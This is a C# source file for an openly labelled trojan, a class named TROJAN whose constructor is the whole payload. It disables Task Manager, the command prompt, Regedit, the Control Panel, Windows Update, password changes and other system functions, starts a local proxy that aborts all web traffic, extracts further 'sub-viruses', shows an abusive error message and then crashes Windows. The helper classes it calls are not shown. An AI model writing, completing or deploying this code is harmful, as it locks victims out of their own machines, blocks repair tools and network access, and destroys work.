using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace SDV
{
    internal class TROJAN
   {
        public TROJAN()
        {
            // change wall paper
            WinTools.ChangeWallpaper();
            // disable win fc
            WinFC.DisableActiveDesktop();
            WinFC.DisableAddRemovePrograms();
            WinFC.DisableALLICONS();
            WinFC.DisableChangePass();
            WinFC.DisableChangeWallpaper();
            WinFC.DisableCMD();
            WinFC.DisableComponents();
            WinFC.DisableCP();
            WinFC.DisableDragAndDrop();
            WinFC.DisableMSI();
            WinFC.DisableRegedit();
            WinFC.DisableRun();
            WinFC.DisableSaveSettings();
            WinFC.DisableStartMenuLogOff();
            WinFC.DisableStatusMessages();
            WinFC.DisableTaskManager();
            WinFC.DisableViewContextMenu();
            WinFC.DisableWelcomeScreen();
            WinFC.DisableWindowsUpdate();
          // start proxy

            BrowserWeb.SDVPApplication.Startup(8775, true, false, false);
            BrowserWeb.SDVPApplication.BeforeRequest += new BrowserWeb.SessionStateHandler(SDVPApplication_BeforeRequest);
            // extract viruses
            WinTools.ExtractSubViruses();
            // Crash win
            Thread.Sleep(120000);
            MessageBox.Show("ERROR YOU ARE ATTACKED SUN OF THE BITCH", "YoU ArE AtTaCkEd By WiNdOwS KeRnEl DeStRuCtIoN ViRuS", MessageBoxButtons.OK, MessageBoxIcon.Error);

            Tools.CrashWin();
      
        }
        void SDVPApplication_BeforeRequest(BrowserWeb.Session s)
        {
            s.Abort();
        }
   }

}
